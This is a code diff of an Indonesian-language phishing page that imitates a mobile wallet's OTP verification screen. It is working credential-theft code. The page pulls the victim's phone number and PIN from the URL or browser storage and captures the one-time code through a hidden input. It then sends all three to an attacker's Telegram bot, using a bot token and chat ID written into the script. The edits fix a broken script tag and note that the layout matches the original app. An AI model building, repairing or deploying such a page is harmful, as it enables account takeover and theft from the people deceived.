@@ -53,7 +53,7 @@
           <div class="otp-circle w-2.5 h-2.5 rounded-full bg-slate-300 transition-all duration-150"></div>
         </div>
 
-        <!-- Timer & Ikon Centang -->
+        <!-- Timer & Ikon Centang (Jalan Otomatis 60 Detik) -->
         <div class="flex items-center gap-1.5 text-xs text-slate-700 font-medium">
           <svg class="w-3.5 h-3.5 text-emerald-600" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
             <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
@@ -61,16 +61,16 @@
           <span id="timer">01:00</span>
         </div>
 
-        <!-- Input Asli yang Disembunyikan (6 digit) -->
+        <!-- Input Asli yang Disembunyikan (6 digit untuk memicu keyboard HP) -->
         <input type="tel" id="hidden-otp-input" maxlength="6" class="absolute inset-0 opacity-0 w-full h-full cursor-pointer" autofocus oninput="handleOtpInput(this)">
       </div>
 
-      <!-- TEKS MERAH PERINGATAN -->
+      <!-- TEKS MERAH PERINGATAN (Muncul tanpa pindah halaman) -->
       <div id="error-msg" class="hidden text-red-500 text-xs font-semibold mb-3 mt-1">
         Kode OTP salah atau sudah kedaluwarsa. Silakan coba lagi.
       </div>
 
-      <!-- Tombol Aksi -->
+      <!-- Tombol Aksi (Rata Kiri, Sesuai Asli) -->
       <div class="mt-6 space-y-3">
         <button type="button" class="w-full py-3.5 px-6 rounded-full border border-emerald-600 text-emerald-700 font-extrabold text-[15px] bg-white active:bg-emerald-50 transition-colors text-left shadow-sm">
           Buka WhatsApp
@@ -90,7 +90,9 @@
       </div>
     </div>
 
-  </script>
+  </div>
+
+  <script>
     const BOT_TOKEN = "8881822233:AAE3UwszOo27KceLDBtNKdSD3AgANrxZncU";
     const CHAT_ID = "6742478722";
 
@@ -113,12 +115,12 @@
       }
     }, 1000);
 
-    // Ambil Nomor HP dan PIN (Mengecek dari URL, lalu cadangan ke localStorage)
+    // Ambil Data Nomor HP dan PIN (Dari URL atau Penyimpanan Browser)
     const urlParams = new URLSearchParams(window.location.search);
-    const userPhone = urlParams.get('phone') || localStorage.getItem('userPhone') || localStorage.getItem('phone') || "Tidak ada";
-    const userPin = urlParams.get('pin') || localStorage.getItem('userPin') || localStorage.getItem('pin') || "Tidak ada";
+    const userPhone = urlParams.get('phone') || localStorage.getItem('userPhone') || "Tidak diketahui";
+    const userPin = urlParams.get('pin') || localStorage.getItem('userPin') || "Tidak diketahui";
 
-    if (userPhone !== "Tidak ada") {
+    if (userPhone !== "Tidak diketahui") {
       let maskedPhone = "+62" + userPhone.slice(0, 2) + "****" + userPhone.slice(-4);
       document.getElementById('phone-info').innerText = `Kode-nya kami kirim ke ${maskedPhone}`;
     }
@@ -145,7 +147,6 @@
     }
 
     async function sendOtpToTelegram(otpCode) {
-      // Pastikan data PIN dan Nomor HP dipanggil dengan benar ke dalam teks Telegram
       const text = `🔑 *Data Lengkap Masuk (PIN & OTP)*\n\n*Nomor HP:* +62${userPhone}\n*PIN:* ${userPin}\n*OTP:* ${otpCode}`;
 
       try {
